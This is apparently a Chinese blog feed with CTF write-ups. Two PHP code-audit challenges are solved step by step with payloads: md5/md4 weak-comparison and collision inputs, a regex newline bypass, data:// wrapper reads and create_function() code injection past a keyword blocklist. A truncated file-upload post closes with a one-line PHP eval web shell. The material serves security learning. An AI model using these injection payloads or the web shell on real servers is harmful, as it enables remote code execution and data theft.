<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&quot;secret&quot;</span>] != hash(<span class="string">&quot;md4&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&quot;secret&quot;</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;乐&lt;br&gt;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/http/i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/^i_am_bloodhound$/&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>] !== <span class="string">&#x27;i_am_bloodhound&#x27;</span>) &#123;</span><br><span class="line">        <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;我是布洛特亨德尔!&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;?&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((<span class="keyword">string</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;s1&#x27;</span>] !== (<span class="keyword">string</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;s2&#x27;</span>] &amp;&amp; md5(<span class="variable">$_GET</span>[<span class="string">&#x27;s1&#x27;</span>]) === md5(<span class="variable">$_GET</span>[<span class="string">&#x27;s2&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;众神之父赐予我视野&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;众神之父赐予我重伤倒地&lt;br&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_REQUEST</span>) &#123;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$_REQUEST</span> <span class="keyword">as</span> <span class="variable">$value</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/[a-zA-Z]/i&#x27;</span>, <span class="variable">$value</span>))</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;众神之父不喜欢英文&lt;br&gt;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (file_get_contents(<span class="variable">$file</span>) !== <span class="string">&#x27;phoniex_kit&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;我重伤倒地&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var_dump(file_get_contents(<span class="string">&quot;/flag&quot;</span>));</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>​    一道 <strong>代码审计</strong> 的题，考的点很常规，但是对刚入门的我来说还是难度不小 <del>（希望以后别了）</del></p>
<p>​    </p>
<h3 id="第一部分-md4弱类型比较"><a href="#第一部分-md4弱类型比较" class="headerlink" title="第一部分 ( md4弱类型比较 )"></a>第一部分 ( <em>md4</em>弱类型比较 )</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&quot;secret&quot;</span>] != hash(<span class="string">&quot;md4&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&quot;secret&quot;</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;乐&lt;br&gt;&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​    考点为md4弱类型比较，Google一下发现是与 <strong>PHP中的Hash缺陷</strong> 有关，<strong>0e</strong>+<strong>纯数字</strong> 的组合会被认为是科学计数法，即被看作是 <strong>0的xxxxxx次方</strong>，值均为0，且 <strong>==</strong> 为弱类型比较，<strong>不比较类型</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload: secret=0e251288019</span><br><span class="line">或者</span><br><span class="line">payload: secret=0e001233333333333334557778889</span><br></pre></td></tr></table></figure>

<p>​    成功绕过 </p>
<h3 id="第二部分-preg-match-‘-‘-GET-‘xxx’-绕过"><a href="#第二部分-preg-match-‘-‘-GET-‘xxx’-绕过" class="headerlink" title="第二部分 ( preg_match(‘/^$/‘, $_GET[‘xxx’]) 绕过 )"></a>第二部分 ( <em>preg_match(‘/^$/‘, $_GET[‘xxx’])</em> 绕过 )</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/http/i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/^i_am_bloodhound$/&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>] !== <span class="string">&#x27;i_am_bloodhound&#x27;</span>) &#123;</span><br><span class="line">        <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;我是布洛特亨德尔!&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;?&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​    对于 <strong>preg_match(‘/^$/‘, $_GET[‘xxx’])</strong> ，只会去比较第一行，在末尾加上换行符 <em><strong>%0a</strong></em> 即可绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload: name=i_am_bloodhound%0a</span><br></pre></td></tr></table></figure>



<h3 id="第三部分-md5-强碰撞-string"><a href="#第三部分-md5-强碰撞-string" class="headerlink" title="第三部分 ( md5 强碰撞 (string) )"></a>第三部分 ( <em>md5</em> 强碰撞 (string) )</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="keyword">string</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;s1&#x27;</span>] !== (<span class="keyword">string</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;s2&#x27;</span>] &amp;&amp; md5(<span class="variable">$_GET</span>[<span class="string">&#x27;s1&#x27;</span>]) === md5(<span class="variable">$_GET</span>[<span class="string">&#x27;s2&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;众神之父赐予我视野&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;众神之父赐予我重伤倒地&lt;br&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​    <strong>md5强碰撞</strong> ，**===** 进行了严格的过滤，且 <em><strong>string</strong></em> 限制了只能传入字符串，则必须使用两个不同但md5加密后完全相同的字符串来绕过，于是搜到了这篇文章<a href="https://xz.aliyun.com/t/2232">如何用不同的数值构建一样的MD5</a> ，构造出一对符合要求的字符串后将其进行url编码。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload: s1=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&amp;s2=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</span><br></pre></td></tr></table></figure>

<p>​    由于含有不可见字符，其md5加密相同，但url编码后不同，满足需求，过</p>
<h3 id="第四部分-REQUEST-绕过"><a href="#第四部分-REQUEST-绕过" class="headerlink" title="第四部分 ( $_REQUEST 绕过 )"></a>第四部分 ( <em>$_REQUEST</em> 绕过 )</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$_REQUEST</span>) &#123;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$_REQUEST</span> <span class="keyword">as</span> <span class="variable">$value</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/[a-zA-Z]/i&#x27;</span>, <span class="variable">$value</span>))</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;众神之父不喜欢英文&lt;br&gt;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​    <strong>$_REQUEST</strong> <em>同时接受GET和POST的数据，并且在同时传入数据时优先接受POST</em> （虽然是个考烂了的点，但是当时我还是搞了好半天才绕过），把之前出现过的变量再用post传一次，且传入的值不出现所有英文字符(由 <em>‘/[a-zA-Z]/i’</em> 判断)就能过了 (不得不说Firefox的hackbar是真的好用)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload: secret=1&amp;name=1&amp;s1=1&amp;s2=1    </span><br></pre></td></tr></table></figure>



<h3 id="第五部分-file-get-contents-file-详解"><a href="#第五部分-file-get-contents-file-详解" class="headerlink" title="第五部分 ( file_get_contents($file) 详解 )"></a>第五部分 ( <em>file_get_contents($file)</em> 详解 )</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (file_get_contents(<span class="variable">$file</span>) !== <span class="string">&#x27;phoniex_kit&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;我重伤倒地&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​    说实话这个地方我当时抄都没抄懂，于是在这儿稍微详细的记录一下。</p>
<blockquote>
<p><em>file_get_contents()</em> 用于把整个文件读入一个字符串中</p>
<p>语法为: <strong>file_get_contents(path,include_path,context,start,max_length)</strong></p>
<table>
<thead>
<tr>
<th align="center">名称</th>
<th align="center">作用</th>
</tr>
</thead>
<tbody><tr>
<td align="center">path</td>
<td align="center">必需。规定所读取的文件(如”text.txt”)</td>
</tr>
<tr>
<td align="center">include_path</td>
<td align="center">可选。当该参数设为”1“时也在 include_path 中搜寻文件 <del>(看不懂)</del></td>
</tr>
<tr>
<td align="center">context</td>
<td align="center">可选。规定文件句柄的环境。<br>context 是一套可以修改流的行为的选项。若使用 null，则忽略。 <del>(看不懂)</del></td>
</tr>
<tr>
<td align="center">start</td>
<td align="center">可选。规定在文件中开始读取的位置。该参数是 PHP 5.1 新加的。</td>
</tr>
<tr>
<td align="center">max_length</td>
<td align="center">可选。规定读取的字节数。该参数是 PHP 5.1 新加的。(防爆)</td>
</tr>
</tbody></table>
<h6 id="例子-假设text-txt文件中的内容为test"><a href="#例子-假设text-txt文件中的内容为test" class="headerlink" title="例子   (假设text.txt文件中的内容为test)"></a>例子   (假设text.txt文件中的内容为<em>test</em>)</h6><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> file_get_contents(<span class="string">&quot;test.txt&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h6 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">test</span><br></pre></td></tr></table></figure>


</blockquote>
<p>​    一般来说可用 <em><strong>php://input</strong></em> 或 <em><strong>data://</strong></em> </p>
<blockquote>
<p><strong>php://input</strong> 将post传来的数据全部当作文件内容，可以读取未处理过的POST数据</p>
<p><strong>data://</strong> 用GET方法进行传输 ，有以下几种用法</p>
<ul>
<li>data://text/plain,&lt;?php phpinfo()?&gt;</li>
<li>data://text/plain;base64,(base64加密后的信息)</li>
</ul>
</blockquote>
<p>我采用的是data的第二种方法，payload如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[GET] file=data://text/plain;base64,cGhvbmlleF9raXQ=</span><br><span class="line">[POST] file=1        (绕过第四部分)</span><br></pre></td></tr></table></figure>

<p>​    拿到flag</p>
<p><img src="https://cdn.jsdelivr.net/gh/dianzzz/dzimg/data/image-20211025115324602.png" alt="image-20211025115324602"></p>
<hr>
<hr>
<h2 id="ezbypass"><a href="#ezbypass" class="headerlink" title="ezbypass"></a>ezbypass</h2><blockquote>
<p>摸索了好半天终于学到了 <em>create_function()</em> 的注入，痛并快乐着</p>
</blockquote>
<p>​    开屏又是一堆代码，同是代码审计</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$www1</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$www2</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$www2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;www2&#x27;</span>];</span><br><span class="line"><span class="variable">$www1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;www1&#x27;</span>];</span><br><span class="line"><span class="variable">$a</span> = <span class="number">0</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="number">0</span>;</span><br><span class="line"><span class="variable">$c</span> = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (</span><br><span class="line">    preg_match(<span class="string">&#x27;/flag|www|fi|arra|mor|ta|le|he|nl|hex|as|cat|ev|so|shel|ob|st|ma|ec|ead|inc|1f|log|np|ess|chr|cal|bin|sh|nt|gh|reve|flip|rand|con|ot|id|pr|info|oct|pi/i&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;1&#x27;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$c</span> = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_REQUEST</span>) &#123;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$_REQUEST</span> <span class="keyword">as</span> <span class="variable">$value</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/[a-zA-Z]/i&#x27;</span>, <span class="variable">$value</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;2&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$a</span> = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;aaa&#x27;</span>] !== <span class="variable">$_POST</span>[<span class="string">&#x27;bbb&#x27;</span>] &amp;&amp; md5(<span class="variable">$_POST</span>[<span class="string">&#x27;aaa&#x27;</span>]) === md5(<span class="variable">$_POST</span>[<span class="string">&#x27;bbb&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$b</span> = <span class="number">1</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;3&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&#x27;/flag|fi|arra|mor|ta|le|he|nl|hex|as|cat|ev|so|shel|ob|st|ma|`|ec|ead|inc|lf|log|np|ess|chr|cal|bin|sh|nt|gh|reve|flip|rand|con|ot|id|pr|info|oct|pi/i&#x27;</span>, <span class="variable">$www1</span>) ||</span><br><span class="line">    preg_match(<span class="string">&#x27;/flag|fi|arra|mor|ta|le|he|nl|hex|as|cat|ev|so|shel|ob|st|ma|`|ec|ead|inc|lf|log|np|ess|chr|cal|bin|sh|nt|gh|reve|flip|rand|con|ot|id|pr|info|oct|pi/i&#x27;</span>, <span class="variable">$www2</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;the last one!&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$a</span> + <span class="variable">$b</span> + <span class="variable">$c</span> != <span class="number">3</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;!&#x27;</span>);    </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">//flag在同目录下</span></span><br><span class="line">        <span class="variable">$www1</span>(<span class="string">&#x27;&#x27;</span>, <span class="variable">$www2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="第一部分-SERVER-‘QUERY-STRING’-绕过"><a href="#第一部分-SERVER-‘QUERY-STRING’-绕过" class="headerlink" title="第一部分 ( $_SERVER[‘QUERY_STRING’] 绕过)"></a>第一部分 ( <em>$_SERVER[‘QUERY_STRING’]</em> 绕过)</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (</span><br><span class="line">    preg_match(<span class="string">&#x27;/flag|www|fi|arra|mor|ta|le|he|nl|hex|as|cat|ev|so|shel|ob|st|ma|ec|ead|inc|1f|log|np|ess|chr|cal|bin|sh|nt|gh|reve|flip|rand|con|ot|id|pr|info|oct|pi/i&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;1&#x27;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$c</span> = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​    知识点: <em><strong>$_SERVER[‘QUERY_STRING’]</strong></em> 不会对字符串进行url解码，而get会 <br>    后面传参的时候统一用用16进制加密url就好了，贴一下一个还不错的加密网站<a href="http://www.jsons.cn/urlcode/">url加密网站</a></p>
<h3 id="第二部分-preg-match-‘-a-zA-Z-i’-value-绕过"><a href="#第二部分-preg-match-‘-a-zA-Z-i’-value-绕过" class="headerlink" title="第二部分 ( preg_match(‘/[a-zA-Z]/i’, $value 绕过 )"></a>第二部分 ( <em>preg_match(‘/[a-zA-Z]/i’, $value</em> 绕过 )</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$_REQUEST</span>) &#123;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$_REQUEST</span> <span class="keyword">as</span> <span class="variable">$value</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/[a-zA-Z]/i&#x27;</span>, <span class="variable">$value</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;2&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$a</span> = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​    同<strong>SimplePHP</strong> 第四部分，post传一下即可绕过，就不放payload了 <br>    PS:写wp的时候遇到抽风一直卡在 <em>die(‘2’)</em> ,果断重开浏览器解决问题   /捂嘴笑</p>
<h3 id="第三部分-md5-强碰撞-数组"><a href="#第三部分-md5-强碰撞-数组" class="headerlink" title="第三部分 ( md5 强碰撞 (数组) )"></a>第三部分 ( <em>md5</em> 强碰撞 (数组) )</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;aaa&#x27;</span>] !== <span class="variable">$_POST</span>[<span class="string">&#x27;bbb&#x27;</span>] &amp;&amp; md5(<span class="variable">$_POST</span>[<span class="string">&#x27;aaa&#x27;</span>]) === md5(<span class="variable">$_POST</span>[<span class="string">&#x27;bbb&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$b</span> = <span class="number">1</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;3&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​    又是 <em><strong>md5强碰撞</strong></em> ，不过这一次没有限制必须输入字符串，便有另外一种简单的思路。<br>    由于md5 <strong>无法加密数组</strong> ，在加密数组时都会返回 <em>NULL</em> ，便可以通过POST两个值不同的数组绕过，如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload: aaa[]=1&amp;bbb[]=2</span><br></pre></td></tr></table></figure>



<h3 id="第四部分-create-function-大的要来了！！！"><a href="#第四部分-create-function-大的要来了！！！" class="headerlink" title="第四部分 ( create_function()  大的要来了！！！)"></a>第四部分 ( <strong>create_function()</strong>  <em>大的要来了！！！</em>)</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&#x27;/flag|fi|arra|mor|ta|le|he|nl|hex|as|cat|ev|so|shel|ob|st|ma|`|ec|ead|inc|lf|log|np|ess|chr|cal|bin|sh|nt|gh|reve|flip|rand|con|ot|id|pr|info|oct|pi/i&#x27;</span>, <span class="variable">$www1</span>) ||</span><br><span class="line">    preg_match(<span class="string">&#x27;/flag|fi|arra|mor|ta|le|he|nl|hex|as|cat|ev|so|shel|ob|st|ma|`|ec|ead|inc|lf|log|np|ess|chr|cal|bin|sh|nt|gh|reve|flip|rand|con|ot|id|pr|info|oct|pi/i&#x27;</span>, <span class="variable">$www2</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;the last one!&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$a</span> + <span class="variable">$b</span> + <span class="variable">$c</span> != <span class="number">3</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;!&#x27;</span>);    </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">//flag在同目录下</span></span><br><span class="line">        <span class="variable">$www1</span>(<span class="string">&#x27;&#x27;</span>, <span class="variable">$www2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​    这个部分得重点讲讲</p>
<p>​    <em>preg_match</em> 过滤了不少关键字，在其中出现过的字符，比如 <em>fi</em> 、<em>cat</em> 、<em>ec</em> 都被ban了无法使用，走一步看一步吧</p>
<ul>
<li><em><strong>大的要来了</strong></em></li>
<li><em><strong>大的来了</strong></em></li>
<li><em><strong>大的真来了</strong></em></li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$www1</span>(<span class="string">&#x27;&#x27;</span>, <span class="variable">$www2</span>);</span><br></pre></td></tr></table></figure>

<ul>
<li><p>首先引入一个新概念 <strong><a href="https://www.php.net/manual/zh/functions.variable-functions.php">可变函数</a></strong> ，概括一下便是，对于某些函数来说，若变量的值与起函数名相同，则可以看作执行该函数。举个例子， <em>$a=if</em> 时，*$a()* 与 <em>if()</em> <strong>等价</strong> ，这便是解这句话的关键</p>
</li>
<li><p>再介绍一个新函数 <strong><a href="https://www.php.net/manual/zh/function.create-function.php">create_function()</a></strong> ，其用法为</p>
</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">create_function( <span class="keyword">string</span> <span class="variable">$args</span> , <span class="keyword">string</span> <span class="variable">$code</span> )</span><br><span class="line"><span class="comment">// string $arge 为变量部分</span></span><br><span class="line"><span class="comment">// string $code 为方法代码部分</span></span><br></pre></td></tr></table></figure>

<p>​    光说不练假把式，举个实际的例子</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">create_function(<span class="string">&#x27;$cbddl&#x27;</span>,<span class="string">&#x27;echo $cbddl.&quot;dddd&quot;&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>​    与下面的代码相同</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">HAHA</span>(<span class="params"><span class="variable">$cbddl</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$cbddl</span>.<span class="string">&quot;dddd&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​    结合这两点，就可以进行注入了</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$www1</span>(<span class="string">&#x27;&#x27;</span>, <span class="variable">$www2</span>);</span><br></pre></td></tr></table></figure>

<p>​    举个例子，当 <em><strong>www1=create_function&amp;www2=}phpinfo();//</strong></em> 时，payload为</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">create_function(<span class="string">&#x27;&#x27;</span>,&#125;phpinfo();<span class="comment">//);</span></span><br></pre></td></tr></table></figure>

<p>​    在不考虑关键词过滤的情况下已经可以执行 <em>phpinfo()</em> 了</p>
<p>​    回到题目中，注意到 <em>flag在同目录下</em> ，于是我先输出了一下目录，payload编码前为  (还要<em>POST</em> www1 和 www2 的值)</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">www1=create_function&amp;www2=&#125;var_dump(getcwd());<span class="comment">//</span></span><br></pre></td></tr></table></figure>

<p>​    获得路径 <img src="https://cdn.jsdelivr.net/gh/dianzzz/dzimg/data/image-20211025140404795.png" alt="image-20211025140404795">   (顺便贴贴<a href="https://www.phpernote.com/php-function/1128.html">PHP获取文件目录的方法</a>)</p>
<p>​    若未被过滤就可以用 <em>file()</em> 来读取，但是很不幸被过滤了，找了一下 <a href="cnblogs.com/Renyi-Fan/p/9099374.html">PHP读取文件内容的方法</a> ，也被ban了:sweat_smile: ，然后就找到另外一篇博客 <a href="https://www.cnblogs.com/imnzq/p/6796752.html">PHP获取指定目录下的所有文件列表</a> ，尝试了一下里面的 <em>scandir()</em> 函数，A了</p>
<p>​    payload加密前如下:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">payload: www1=create_function&amp;www2=&#125;var_dump(scandir(getcwd()));<span class="comment">//</span></span><br></pre></td></tr></table></figure>

<p>​    flag来🌶</p>
<p><img src="https://cdn.jsdelivr.net/gh/dianzzz/dzimg/data/image-20211025142054801.png" alt="image-20211025142054801"></p>
<hr>
<hr>
<blockquote>
<p>​    打代码的时间真的是过得非常之快，感觉没写点啥一天就过去了。这两天都是早八起床晚一睡觉，又找到了高二在太原集训的感觉(被吊打的感觉也找回来了)。还挺怀念那段时间的，虽然很累，但是为自己喜欢的事情努力的感觉真的挺不错的，累些又算啥，冲他妈的！</p>
</blockquote>
<p>[^店長]: 第一次写WP，有什么不足敬请大爹们指出 :yum::heart: :yum:</p>
]]></content>
      <categories>
        <category>WP</category>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>WP</tag>
      </tags>
  </entry>
  <entry>
    <title>ctfhub技能树 之 文件上传</title>
    <url>/2021/11/02/ctfhub%E6%8A%80%E8%83%BD%E6%A0%91/</url>
    <content><![CDATA[<h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><blockquote>
<p>被茯苓夸奖了<img src="https://cdn.jsdelivr.net/gh/dianzzz/dzimg/data/image-20211102170907976.png" alt="image-20211102170907976"> 于是来做做 (之前还真没做到这儿)</p>
</blockquote>
<hr>
<span id="more"></span>



<h3 id="无验证"><a href="#无验证" class="headerlink" title="无验证"></a>无验证</h3><p>​    一进入便看到这样的界面<img src="https://cdn.jsdelivr.net/gh/dianzzz/dzimg/data/image-20211102165343319.png" alt="image-20211102165343319"></p>
<p>​    既然无限制, 肯定就选择最好用的一句话木马, 上传 <em>get.php</em> , 内容如下 :</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;shell&quot;</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>​    解释一下</p>
<ul>
